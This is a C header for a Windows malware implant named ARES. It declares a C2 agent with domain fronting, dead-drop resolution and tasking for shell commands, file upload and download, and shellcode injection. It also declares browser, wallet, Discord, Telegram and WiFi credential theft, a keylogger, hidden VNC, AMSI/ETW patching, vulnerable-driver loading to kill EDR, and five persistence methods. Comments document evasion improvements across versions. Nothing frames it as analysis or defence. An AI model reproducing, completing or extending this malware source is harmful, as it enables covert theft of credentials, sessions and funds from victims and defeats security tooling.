#ifndef ARES_AGENT_H
#define ARES_AGENT_H

/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES FRAMEWORK — Native Agent Core (Ring-3 / Ring-0 Ready)
 *  Language: C (compiled to native x64 PE)
 *  
 *  NO CLR, NO GC, NO AMSI, NO ETW interception.
 *  Direct syscalls, manual memory management, zero dependencies.
 * ═══════════════════════════════════════════════════════════════
 */

/* v3.7 FIX-13: Debug output macros — FAIL-CLOSED design.
 * Old: required -DARES_RELEASE to suppress output (opt-out — easy to forget)
 * New: requires -DARES_DEBUG to ENABLE output (opt-in — silent by default)
 * A misconfigured build will NEVER leak debug strings. */
#include <stdio.h>
#ifdef ARES_DEBUG
  /* Debug mode: preserve fprintf/fflush for development builds */
#else
  /* Production mode (DEFAULT): suppress all debug output */
  #undef fprintf
  #undef fflush
  #define fprintf(stream, ...) ((void)0)
  #define fflush(stream) ((void)0)
#endif

#include <windows.h>
#include <winternl.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ── Build Configuration ── */
/* v3.4: Version as integers — no string literal in binary */
#define ARES_VER_MAJOR  3
#define ARES_VER_MINOR  4
#define ARES_VER_PATCH  0
#define ARES_MAX_C2         8
#define ARES_BEACON_JITTER  0.3    /* 30% jitter on sleep */
#define ARES_MAX_TASKS      32     /* v3.2: reduced from 64 to prevent task queue flooding */
/* v3.4: Pipe name assembled at runtime — no full literal in .rdata */
#define ARES_PIPE_PREFIX L"\\\\.\\pipe\\"
#define ARES_PIPE_SUFFIX L"crashpad_handler"

/* ── Syscall Numbers (Windows 10 21H2+) ── */
/* SSNs are resolved at runtime from clean ntdll */
typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtReadVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
    DWORD NtClose;
    DWORD NtQuerySystemInformation;
    DWORD NtQueryInformationProcess;
    DWORD NtCreateFile;
    DWORD NtReadFile;
    DWORD NtWriteFile;
    DWORD NtFreeVirtualMemory;
    DWORD NtCreateSection;
    DWORD NtMapViewOfSection;
    DWORD NtUnmapViewOfSection;
    DWORD NtDelayExecution;
    DWORD NtSetInformationThread;  /* ThreadHideFromDebugger */
    DWORD NtQueryVirtualMemory;
    /* v3.7 FIX-01: ProcessHollow syscall migration */
    DWORD NtGetContextThread;
    DWORD NtSetContextThread;
    /* NtUnmapViewOfSection already declared at line 66 */
    DWORD NtResumeThread;
} SYSCALL_TABLE;

/* ── Indirect Syscall Stub ── */
/* Emits: mov r10, rcx; mov eax, SSN; jmp [syscall_addr] */
typedef struct _SYSCALL_STUB {
    BYTE  mov_r10_rcx[3];  /* 4C 8B D1 */
    BYTE  mov_eax[1];      /* B8 */
    DWORD ssn;             /* XX XX 00 00 */
    BYTE  jmp[2];          /* FF 25 */
    DWORD rip_offset;      /* 00 00 00 00 */
    PVOID syscall_addr;    /* address of syscall; ret gadget in ntdll */
} SYSCALL_STUB;

/* ── Agent Configuration (XOR-encrypted in .rdata) ── */
typedef struct _AGENT_CONFIG {
    char     campaign_id[32];
    char     c2_endpoints[ARES_MAX_C2][256];
    int      c2_count;
    char     aes_key[33];          /* 256-bit AES key */
    char     dead_drop_urls[4][512]; 
    int      dead_drop_count;
    DWORD    sleep_ms;
    DWORD    kill_date;            /* UNIX timestamp — auto-destruct */
    BYTE     xor_key;
    BOOL     persistence_enabled;
    BOOL     socks5_enabled;
    BOOL     hvnc_enabled;
    char     path_register[32];    /* per-campaign API path for register */
    char     path_beacon[32];      /* per-campaign API path for beacon */
    char     path_result[32];      /* per-campaign API path for result */
    char     path_exfil[32];       /* per-campaign API path for exfil */
} AGENT_CONFIG;

/* ── Task from C2 ── */
typedef enum _TASK_TYPE {
    TASK_NOP = 0,
    TASK_SHELL,              /* Execute shell command */
    TASK_DOWNLOAD,           /* Download file to disk */
    TASK_UPLOAD,             /* Upload file to C2 */
    TASK_INJECT,             /* Inject shellcode into process */
    TASK_STEAL_BROWSER,      /* Steal browser credentials */
    TASK_STEAL_CLOUD,        /* Steal cloud secrets */
    TASK_STEAL_TOKENS,       /* Steal Discord/Telegram tokens */
    TASK_SCREENSHOT,         /* Capture screen */
    TASK_SOCKS5_START,       /* Start SOCKS5 relay */
    TASK_SOCKS5_STOP,        /* Stop SOCKS5 relay */
    TASK_HVNC_START,         /* Start hidden VNC */
    TASK_HVNC_STOP,          /* Stop hidden VNC */
    TASK_PERSIST,            /* Install persistence */
    TASK_MIGRATE,            /* Migrate to another process */
    TASK_SLEEP,              /* Change sleep interval */
    TASK_SELFDESTRUCT,       /* Cleanup and exit */
    TASK_LOAD_MODULE,        /* Load BOF (Beacon Object File) */
    TASK_BYOVD_LOAD,         /* Load vulnerable driver */
    TASK_FIRMWARE_RECON,     /* UEFI/BIOS recon */
    TASK_UNHOOK,             /* Re-unhook ntdll */
} TASK_TYPE;

typedef struct _C2_TASK {
    DWORD    task_id;
    TASK_TYPE type;
    DWORD    data_len;
    BYTE     data[0];   /* flexible array — task payload */
} C2_TASK;

/* ── Agent State ── */
typedef struct _AGENT_STATE {
    SYSCALL_TABLE  syscalls;
    AGENT_CONFIG   config;
    HANDLE         c2_pipe;       /* Named pipe or socket */
    BYTE*          clean_ntdll;   /* Clean ntdll.dll bytes from disk */
    SIZE_T         ntdll_size;
    PVOID          syscall_region; /* RX region for indirect syscall stubs (W^X finalized) */
    DWORD          pid;
    DWORD          ppid;
    BOOL           elevated;
    BOOL           is_64bit;
    char           hostname[64];
    char           username[64];
    char           domain[64];
    char           os_version[128];
    BYTE           hwid[32];     /* SHA256 of hardware identifiers */
    DWORD          session_id;
    volatile BOOL  running;
} AGENT_STATE;

/* ── Core Functions ── */

/* init.c — Bootstrap */
BOOL  Ares_Init(AGENT_STATE* state);
BOOL  Ares_ResolveSyscalls(AGENT_STATE* state);
BOOL  Ares_UnhookNtdll(AGENT_STATE* state);
PVOID Ares_BuildSyscallStub(AGENT_STATE* state, DWORD ssn);
BYTE* read_clean_ntdll(SIZE_T* out_size);

/* syscall.c — Indirect Syscall Wrappers */
NTSTATUS Ares_NtAllocateVirtualMemory(AGENT_STATE* s, HANDLE proc, PVOID* base, SIZE_T* size, ULONG type, ULONG protect);
NTSTATUS Ares_NtProtectVirtualMemory(AGENT_STATE* s, HANDLE proc, PVOID* base, SIZE_T* size, ULONG newprot, PULONG oldprot);
NTSTATUS Ares_NtWriteVirtualMemory(AGENT_STATE* s, HANDLE proc, PVOID base, PVOID buffer, SIZE_T size, PSIZE_T written);
NTSTATUS Ares_NtCreateThreadEx(AGENT_STATE* s, PHANDLE thread, HANDLE proc, PVOID start, PVOID param);

/* syscall.c — Extended Wrappers (v2.2 — chrome_inject support) */
NTSTATUS Ares_NtOpenProcess(AGENT_STATE* s, PHANDLE procHandle, ACCESS_MASK access, DWORD pid);
NTSTATUS Ares_NtQuerySystemInformation(AGENT_STATE* s, ULONG infoClass, PVOID buffer, ULONG bufLen, PULONG returnLen);
NTSTATUS Ares_NtReadVirtualMemory(AGENT_STATE* s, HANDLE proc, PVOID base, PVOID buffer, SIZE_T size, PSIZE_T bytesRead);
NTSTATUS Ares_NtFreeVirtualMemory(AGENT_STATE* s, HANDLE proc, PVOID* base, SIZE_T* size, ULONG freeType);
/* v5.0: Ares_NtClose moved to standalone (no AGENT_STATE), see below */
NTSTATUS Ares_NtQueryVirtualMemory(AGENT_STATE* s, HANDLE proc, PVOID base, ULONG infoClass, PVOID buffer, SIZE_T bufLen, PSIZE_T returnLen);

/* syscall.c — ProcessHollow Wrappers (v3.7 FIX-01) */
NTSTATUS Ares_NtGetContextThread(AGENT_STATE* s, HANDLE thread, PCONTEXT ctx);
NTSTATUS Ares_NtSetContextThread(AGENT_STATE* s, HANDLE thread, PCONTEXT ctx);
NTSTATUS Ares_NtUnmapViewOfSection(AGENT_STATE* s, HANDLE proc, PVOID baseAddr);
NTSTATUS Ares_NtResumeThread(AGENT_STATE* s, HANDLE thread, PULONG suspendCount);

/* syscall.c — v5.0 Standalone NtFile Syscalls (no AGENT_STATE needed)
 * Used by stealer/main for direct credential file reads.
 * Goes through ntdll .text — invisible to EDR userland hooks. */
NTSTATUS Ares_NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
    const char* DosPath, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions);
NTSTATUS Ares_NtReadFile(HANDLE FileHandle, PVOID Buffer, ULONG Length,
    PLARGE_INTEGER ByteOffset, ULONG* BytesRead);
NTSTATUS Ares_NtQueryInformationFile(HANDLE FileHandle, PLARGE_INTEGER FileSize);
NTSTATUS Ares_NtClose(HANDLE Handle);

/* chrome_inject.c — Memory scan for decrypted AES key (ChromeKatz approach) */
int Ares_ChromeScanKey(AGENT_STATE* s, BYTE* outKey, int maxKey);
int Ares_ChromeScanKeyW32(BYTE* outKey, int maxKey);

/* stealer.c — Full DPAPI + AES-GCM Credential Theft */
typedef struct _DECRYPTED_CRED {
    char url[512];
    char username[256];
    char password[512];
    char browser[32];
    char profile[32];
    char decrypt_status[16]; /* "ok", "v20_blocked", "dpapi_fail" */
} DECRYPTED_CRED;

typedef struct _STOLEN_COOKIE {
    char host[256];
    char name[128];
    char value[4096];
    char path[256];
    char sameSite[16];   /* None, Lax, Strict */
    char browser[32];    /* Chrome, Edge, Brave */
    INT64 expires;
    BOOL secure;
    BOOL httponly;
    BOOL session;        /* true = session cookie, no expiry */
} STOLEN_COOKIE;

int   Ares_StealChromeCreds(DECRYPTED_CRED* creds, int max_creds);
int   Ares_CDP_DecryptPasswords(DECRYPTED_CRED* creds, int count); /* v20 CDP path */
int   Ares_CDP_StealLivePasswords(DECRYPTED_CRED* creds, int max_creds); /* live Chrome CDP */
int   Ares_StealChromelevator(DECRYPTED_CRED* creds, int max_creds, STOLEN_COOKIE* cookies, int max_cookies); /* chromelevator reflective hollow */
int   Ares_StealChromeCookies(STOLEN_COOKIE* cookies, int max_cookies);

typedef struct _STOLEN_WALLET {
    char extension_name[128];
    char browser[64];
    BYTE data[65536];
    int  data_len;
} STOLEN_WALLET;

int   Ares_StealWallets(STOLEN_WALLET* wallets, int max_wallets);

/* ── App session/token theft (Discord, Telegram, Firefox) ── */

typedef struct _STOLEN_TOKEN {
    char app[32];       /* "Discord", "Telegram", "Firefox", "Steam", "FileZilla" */
    char type[16];      /* "token", "session", "credential" */
    char value[4096];   /* Token string or base64 session data */
    char path[512];     /* Source file path */
    int  data_len;      /* For binary session data */
} STOLEN_TOKEN;

int   Ares_StealDiscordTokens(STOLEN_TOKEN* tokens, int max_tokens);
int   Ares_StealTelegramSession(STOLEN_TOKEN* tokens, int max_tokens);
int   Ares_StealFirefoxCreds(DECRYPTED_CRED* creds, int max_creds);

/* ── WiFi password stealer ── */
typedef struct _STOLEN_WIFI {
    char ssid[128];
    char password[256];
    char auth[64];
} STOLEN_WIFI;

int   Ares_StealWifi(STOLEN_WIFI* results, int max_results);

/* ── Screenshot capture ── */
typedef struct _SCREENSHOT_DATA {
    int width;
    int height;
    BYTE* bmp_data;
    int bmp_size;
} SCREENSHOT_DATA;

BOOL  Ares_TakeScreenshot(SCREENSHOT_DATA* ss);

/* ── System recon ── */
typedef struct _SYSTEM_RECON {
    char local_ip[64];
    int  cpu_count;
    int  ram_mb;
    int  process_count;
    char av_products[512];
    char interesting_procs[1024];
    BOOL is_elevated;
    char domain[128];
} SYSTEM_RECON;

int   Ares_SystemRecon(SYSTEM_RECON* info);

/* ── Keylogger ── */
int   Ares_KeylogSnapshot(char* out, int max_len, int duration_ms);

/* ── Clipboard ── */
int   Ares_ClipboardSnapshot(char* out, int max_len);

/* evasion.c — Anti-Analysis */
BOOL  Ares_CheckSandbox(void);
BOOL  Ares_PatchAMSI(void);
BOOL  Ares_PatchETW(void);
BOOL  Ares_PatchETW_Ex(AGENT_STATE* state); /* v3.8: uses indirect syscalls for ETW patch */
void  Ares_SleepWithJitter(DWORD base_ms, double jitter);
void  Ares_SleepObfuscated(DWORD base_ms, double jitter);

/* stack_spoof.c — Call Stack Verification Bypass (v3.5) */
BOOL  Ares_InitStackSpoof(void);
PVOID Ares_GetK32RetGadget(void);
PVOID Ares_GetKBRetGadget(void);
BOOL  Ares_IsAddrInModule(PVOID addr);

/* socks5.c — SOCKS5 Relay */
BOOL  Ares_Socks5_Start(AGENT_STATE* state, const char* listen_host, int port);
void  Ares_Socks5_Stop(void);

/* hvnc.c — Hidden VNC */
BOOL  Ares_HVNC_Start(AGENT_STATE* state);
void  Ares_HVNC_Stop(void);

/* inject.c — Process Injection */
BOOL  Ares_Inject_RemoteThread(AGENT_STATE* state, const char* target, const BYTE* sc, SIZE_T len);
BOOL  Ares_Inject_EarlyBird(AGENT_STATE* state, const wchar_t* host_exe, const BYTE* sc, SIZE_T len);
BOOL  Ares_Inject_ProcessHollow(AGENT_STATE* state, const wchar_t* host_exe, const BYTE* pe, SIZE_T len);
BOOL  Ares_Migrate(AGENT_STATE* state, const char* target, const BYTE* sc, SIZE_T len);
/* v3.5: Threadless injection — no NtCreateThreadEx, no kernel thread callback */
BOOL  Ares_Inject_Threadless(AGENT_STATE* state, const char* target, const BYTE* sc, SIZE_T len);

/* cap_loader.c — Modular Capability Loader (v3.5 Phase-2)
 * Pulls capability DLLs from C2 on-demand, reflectively loads them
 * into appropriate host processes. Each capability runs in isolation. */
typedef enum _CAPABILITY_ID {
    CAP_STEALER = 0,     /* inject into RuntimeBroker.exe */
    CAP_HVNC,            /* inject into explorer.exe */
    CAP_SOCKS5,          /* inject into svchost.exe */
    CAP_KEYLOG,          /* inject into ctfmon.exe */
    CAP_MAX
} CAPABILITY_ID;

typedef struct _CAPABILITY_INFO {
    CAPABILITY_ID id;
    const char*   host_process;    /* target process for injection */
    BOOL          loaded;
    DWORD         host_pid;
    HANDLE        pipe;            /* encrypted IPC pipe to core */
} CAPABILITY_INFO;

BOOL  Ares_LoadCapability(AGENT_STATE* state, CAPABILITY_ID cap,
                          const BYTE* dll_data, SIZE_T dll_size);
BOOL  Ares_UnloadCapability(CAPABILITY_ID cap);
BOOL  Ares_SendToCapability(CAPABILITY_ID cap, const BYTE* data, SIZE_T len);
BOOL  Ares_RecvFromCapability(CAPABILITY_ID cap, BYTE* buf, SIZE_T buflen, SIZE_T* received);
BOOL  g_capabilities_loaded(CAPABILITY_ID cap); /* v3.8: check if cap is loaded+connected */

/* byovd.c — BYOVD Kernel Access */
BOOL  Ares_BYOVD_LoadDriver(const char* driver_path);
BOOL  Ares_BYOVD_ReadKernelMemory(PVOID addr, PVOID buffer, SIZE_T size);
BOOL  Ares_BYOVD_WriteKernelMemory(PVOID addr, PVOID buffer, SIZE_T size);
BOOL  Ares_BYOVD_KillEDR(const char* process_name);
void  Ares_BYOVD_Cleanup(void);

/* persist.c — Persistence (5 methods) */
BOOL  Ares_Persist_RegistryRun(AGENT_STATE* state);
BOOL  Ares_Persist_ScheduledTask(AGENT_STATE* state);
BOOL  Ares_Persist_DLLHijack(AGENT_STATE* state);
BOOL  Ares_Persist_COMHijack(AGENT_STATE* state);
BOOL  Ares_Persist_WMI(AGENT_STATE* state);
void  Ares_Persist_Cleanup(void);

/* chrome_v20.c — Chrome App-Bound Encryption + CDP Fallback */
int   Ares_DecryptV20(const BYTE* encrypted, int enc_len, BYTE* decrypted, int dec_max);
int   Ares_CDP_StealCookies(STOLEN_COOKIE* cookies, int max_cookies);
int   Ares_CDP_StealAllBrowsers(STOLEN_COOKIE* cookies, int max_cookies);

/* chrome_inject.c — Shellcode Injection into chrome.exe for v20 Decrypt */
int   Ares_ChromeInject_DecryptV20(AGENT_STATE* state, const BYTE* encrypted, int enc_len, BYTE* decrypted, int dec_max);
int   Ares_DecryptV20_Enhanced(AGENT_STATE* state, const BYTE* encrypted, int enc_len, BYTE* decrypted, int dec_max);

/* core.c — W^X Finalize: RW→RX for syscall stub region */
BOOL  Ares_FinalizeSyscallStubs(AGENT_STATE* state);

/* core.c — AES-256-GCM config decrypt via BCrypt (v3.9) */
BOOL  Ares_AES_GCM_Decrypt(const BYTE* enc, DWORD enc_len, const BYTE* key,
                            const BYTE* nonce, BYTE* out);

/* Credential value classification */
typedef struct _CRED_SCORE {
    int financial;    /* Banking, crypto, payment */
    int social;       /* Email, social media */
    int corporate;    /* VPN, internal, cloud */
    int entertainment;/* Gaming, streaming */
    int total;
} CRED_SCORE;

void  Ares_ClassifyCredentials(DECRYPTED_CRED* creds, int count, CRED_SCORE* score);
BOOL  Ares_IsCookieHighValue(const STOLEN_COOKIE* cookie);

/* eprocess.c — Kernel Process Walker */
typedef struct _KERNEL_PROCESS_INFO {
    DWORD64 eprocess;
    DWORD64 pid;
    char    name[16];
    BYTE    protection;
    BYTE    signatureLevel;
} KERNEL_PROCESS_INFO;

int     Ares_WalkProcessList(KERNEL_PROCESS_INFO* procs, int max_procs);
DWORD64 Ares_FindEprocess(const char* process_name);
BOOL    Ares_RemovePPL(DWORD64 eprocess);
BOOL    Ares_HideProcess(DWORD64 eprocess);
BOOL    Ares_StealSystemToken(DWORD64 target_eprocess);
BOOL    Ares_KillEDR_Full(const char* edr_name);
int     Ares_KillAllEDR(void);

/* bof_loader.c — Beacon Object File Loader */
int   Ares_BOF_Execute(const BYTE* coff_data, SIZE_T coff_size,
                       const char* args, int args_len,
                       char* output, int output_max);

/* domain_front.c — Domain Fronting C2 */
typedef struct _FRONT_RESPONSE {
    BYTE*  body;
    DWORD  body_len;
    DWORD  status_code;
} FRONT_RESPONSE;

FRONT_RESPONSE Ares_C2_DomainFront_WithFailover(
    AGENT_STATE* state, const char* bot_id,
    const char* method, const BYTE* body, DWORD body_len);

/* dead_drop.c — Dead Drop Resolver (C2 from public profiles) */
BOOL DeadDrop_Resolve(const char** urls, int url_count, char* c2_host_out, int* c2_port_out);

/* cleanup.c — Self-Destruction */
void  Ares_SelfDestruct(AGENT_STATE* state);

/* ── Heap Encryption Macros (v3.5 Phase-1) ──
 * Wraps HeapAlloc/HeapFree with automatic XOR encryption on free.
 * Prevents stolen credentials/tokens from sitting in cleartext heap.
 * SECURE_WIPE: XOR-encrypt then zero the buffer before freeing.
 * The XOR step ensures freed memory doesn't contain recognizable patterns
 * even if the heap page is not immediately returned to the OS. */

static inline void _secure_wipe(void* ptr, SIZE_T size) {
    if (!ptr || size == 0) return;
    volatile BYTE* p = (volatile BYTE*)ptr;
    /* Pass 1: XOR with pattern (destroys recognizable data) */
    for (SIZE_T i = 0; i < size; i++) p[i] ^= 0xAA;
    /* Pass 2: Zero */
    for (SIZE_T i = 0; i < size; i++) p[i] = 0;
}

#define SECURE_ALLOC(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size))
#define SECURE_FREE(ptr, size) do { \
    if (ptr) { _secure_wipe((ptr), (size)); HeapFree(GetProcessHeap(), 0, (ptr)); (ptr) = NULL; } \
} while(0)
#define SECURE_WIPE(ptr, size) _secure_wipe((ptr), (size))

#ifdef __cplusplus
}
#endif

#endif /* ARES_AGENT_H */
